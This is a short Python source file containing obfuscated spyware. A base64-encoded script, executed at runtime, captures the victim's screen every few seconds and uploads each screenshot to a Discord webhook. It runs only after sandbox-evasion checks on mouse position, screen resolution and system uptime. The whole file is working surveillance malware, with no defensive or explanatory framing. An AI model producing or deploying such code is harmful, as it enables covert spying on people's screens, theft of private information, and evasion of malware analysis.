import base64

encode_script = base64.b64encode(b"""
from PIL import ImageGrab
import requests, tempfile,os, time, pyautogui, psutil

web_hook = ""

def capture_screenshots():
    try:
        temp_dir = tempfile.mkdtemp()
        pic_path = os.path.join(temp_dir,  'img.jpg')
        ImageGrab.grab().save(pic_path, "JPEG")
        return pic_path
    except Exception as e:
        return

def send_to_discord(filename):
    with open(filename, 'rb') as file:
        response = requests.post(web_hook, files = {'file' : file})
    os.remove(filename)
    return response.status_code

def check_net():
    try:
        requests.get("http://www.google.com", timeout=5)
        return True
    except requests.ConnectionError:
        return False

def run():
    while True:
        try:
            while not check_net():
                print("No internet")
                time.sleep(10)
        
            screen_shot_file = capture_screenshots()
            status = send_to_discord(screen_shot_file)
            print(f"Sent status: {status}")
        
            time.sleep(5)
    
        except KeyboardInterrupt:
            break


def evade():
    def is_user_active():
        return pyautogui.position() != (0, 0)

    def is_normal_screen_resolution():
        width, height = pyautogui.size()
        return width >= 1024 and height >= 768

    def check_uptime(min_seconds = 200):
        try:
            uptime = time.time() - psutil.boot_time()
            return uptime >=min_seconds
        except:
            return False

    while True:
        if is_user_active() and is_normal_screen_resolution() and check_uptime():
            run()
        else:
            continue
        time.sleep(10)

if __name__ == "__main__":
    evade()
""").decode()

exec(base64.b64decode(encode_script).decode())

